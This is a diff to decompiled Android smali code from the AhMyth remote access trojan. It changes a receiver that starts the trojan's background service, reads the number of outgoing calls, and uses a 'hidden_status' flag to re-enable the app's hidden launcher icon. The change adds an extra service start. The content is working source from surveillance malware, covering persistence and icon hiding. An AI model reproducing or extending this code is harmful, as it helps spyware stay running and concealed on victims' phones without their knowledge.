@@ -19,16 +19,19 @@
     .locals 3
 
     .line 19
+    invoke-static {p1}, Lahmyth/mine/king/ahmyth/MainService;->startService(Landroid/content/Context;)V
+
+    .line 20
     new-instance v0, Landroid/content/Intent;
 
     const-class v1, Lahmyth/mine/king/ahmyth/MainService;
 
     invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    .line 20
+    .line 21
     invoke-static {p1, v0}, Landroid/support/v4/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V
 
-    .line 24
+    .line 25
     invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
 
     move-result-object v0
@@ -43,12 +46,12 @@
 
     const-string v0, "android.intent.extra.PHONE_NUMBER"
 
-    .line 26
+    .line 27
     invoke-virtual {p2, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object p2
 
-    .line 28
+    .line 29
     invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;
 
     move-result-object v0
@@ -69,51 +72,51 @@
 
     const/4 v0, 0x0
 
-    .line 30
+    .line 31
     invoke-virtual {p1, p2, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
 
     move-result-object p2
 
     const-string v1, "hidden_status"
 
-    .line 31
+    .line 32
     invoke-interface {p2, v1, v0}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
 
     move-result v2
 
     if-eqz v2, :cond_0
 
-    .line 35
+    .line 36
     invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
 
     move-result-object p2
 
-    .line 36
+    .line 37
     invoke-interface {p2, v1, v0}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
 
-    .line 37
+    .line 38
     invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->commit()Z
 
-    .line 39
+    .line 40
     new-instance p2, Landroid/content/ComponentName;
 
     const-class v1, Lahmyth/mine/king/ahmyth/MainActivity;
 
     invoke-direct {p2, p1, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    .line 41
+    .line 42
     invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
     move-result-object v1
 
     const/4 v2, 0x1
 
-    .line 42
+    .line 43
     invoke-virtual {v1, p2, v2, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     const-string p2, "AhMyth\'s icon has been revealed!"
 
-    .line 46
+    .line 47
     invoke-static {p1, p2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
 
     move-result-object p1
